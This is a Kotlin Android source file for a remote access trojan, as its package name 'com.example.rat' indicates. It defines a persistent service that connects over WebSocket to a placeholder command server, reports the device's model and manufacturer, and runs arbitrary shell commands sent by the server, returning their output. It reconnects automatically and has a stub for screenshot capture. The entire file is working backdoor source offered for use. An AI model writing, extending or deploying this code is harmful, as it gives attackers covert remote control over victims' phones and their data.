package com.example.rat

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import okhttp3.*
import okio.ByteString
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class MainService : Service() {

    private lateinit var webSocket: WebSocket
    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .build()

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        connectWebSocket()
        return START_STICKY
    }

    private fun connectWebSocket() {
        val request = Request.Builder()
            .url("wss://your-server.com") // Replace with your server
            .build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.i(TAG, "WebSocket connected")
                sendDeviceInfo()
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                Log.i(TAG, "Message received: $text")
                handleMessage(text)
            }

            override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
                Log.i(TAG, "Binary message received")
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                Log.i(TAG, "WebSocket closed: $reason")
                reconnect()
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "WebSocket error: ${t.message}")
                reconnect()
            }
        })
    }

    private fun sendDeviceInfo() {
        val deviceInfo = JSONObject().apply {
            put("type", "device_info")
            put("info", JSONObject().apply {
                put("model", android.os.Build.MODEL)
                put("sdk", android.os.Build.VERSION.SDK_INT)
                put("manufacturer", android.os.Build.MANUFACTURER)
            })
        }
        webSocket.send(deviceInfo.toString())
    }

    private fun handleMessage(message: String) {
        try {
            val json = JSONObject(message)
            when (json.getString("type")) {
                "command" -> handleCommand(json)
                "ping" -> handlePing()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error handling message: ${e.message}")
        }
    }

    private fun handleCommand(command: JSONObject) {
        val commandId = command.getString("id")
        val payload = command.getJSONObject("payload")

        try {
            when (payload.getString("type")) {
                "shell" -> executeShellCommand(commandId, payload.getString("command"))
                "screenshot" -> takeScreenshot(commandId, payload.getInt("quality"))
                // Add more command types here
            }
        } catch (e: Exception) {
            sendCommandResult(commandId, false, "Error: ${e.message}")
        }
    }

    private fun executeShellCommand(commandId: String, cmd: String) {
        try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            val output = process.inputStream.bufferedReader().use { it.readText() }
            val error = process.errorStream.bufferedReader().use { it.readText() }
            val exitCode = process.waitFor()

            if (exitCode == 0) {
                sendCommandResult(commandId, true, output)
            } else {
                sendCommandResult(commandId, false, error)
            }
        } catch (e: Exception) {
            sendCommandResult(commandId, false, "Exception: ${e.message}")
        }
    }

    private fun takeScreenshot(commandId: String, quality: Int) {
        // Implement screenshot capture
        sendCommandResult(commandId, false, "Screenshot not implemented")
    }

    private fun sendCommandResult(commandId: String, success: Boolean, result: String) {
        val json = JSONObject().apply {
            put("type", "command_result")
            put("commandId", commandId)
            put("success", success)
            put("result", result)
        }
        webSocket.send(json.toString())
    }

    private fun handlePing() {
        val pong = JSONObject().apply {
            put("type", "pong")
        }
        webSocket.send(pong.toString())
    }

    private fun reconnect() {
        Thread.sleep(5000)
        connectWebSocket()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        const val TAG = "MainService"
        
        fun startService(context: Context) {
            val intent = Intent(context, MainService::class.java)
            context.startForegroundService(intent)
        }
    }
}